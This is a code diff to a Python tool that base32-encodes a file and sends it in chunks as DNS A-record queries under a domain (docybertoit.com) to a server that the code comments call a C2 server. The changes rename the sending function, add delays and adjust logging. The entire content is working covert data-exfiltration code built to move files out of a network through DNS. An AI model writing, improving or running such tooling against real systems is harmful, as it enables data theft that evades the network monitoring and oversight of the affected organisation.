@@ -11,6 +11,7 @@ import dns.message
 import dns.asyncquery
 import dns.asyncresolver
 from dns.exception import Timeout
+import time
 
 file_uuid_str = f'{uuid.uuid4()}'
 def main():
@@ -43,18 +44,20 @@ def main():
     """
 
     setup_query =  f'{file_uuid_str}.A.{num_chunks}.docybertoit.com'
-    send_query(setup_query)
+    send_plaintext_query(setup_query)
+    time.sleep(1)
     counter = 0
     for chunk in file_b32_str_list:
         file_chunk_query = f'{file_uuid_str}.D.{counter}.{chunk}.docybertoit.com'
-        send_query(file_chunk_query)
+        send_plaintext_query(file_chunk_query)
         counter += 1
 
     finish_query = f'{file_uuid_str}.Z.{counter}.docybertoit.com'
-    send_query(finish_query)
+    time.sleep(1)
+    send_plaintext_query(finish_query)
 
 
-def send_query(query: str):
+def send_plaintext_query(query: str):
     """sends a query using the dnspython package to the c2 server. 
     """
 
@@ -62,12 +65,12 @@ def send_query(query: str):
 
     #https://dnspython.readthedocs.io/en/stable/query.html#dns.query.udp
     q = dns.message.make_query(query, 'A')
+    server = "10.0.10.163"
     try:
-        r = dns.query.udp(q=q, where='10.0.10.163', timeout=.00001)
-        print(r)
+        r = dns.query.udp(q=q, where=server, timeout=.00001)
     except dns.exception.Timeout as e:
+        print(f"sending: {query} to {server}")
         return  # this is expected, we don't care about the return query
-        print(e)
     except Exception as e:
         print(e)
 
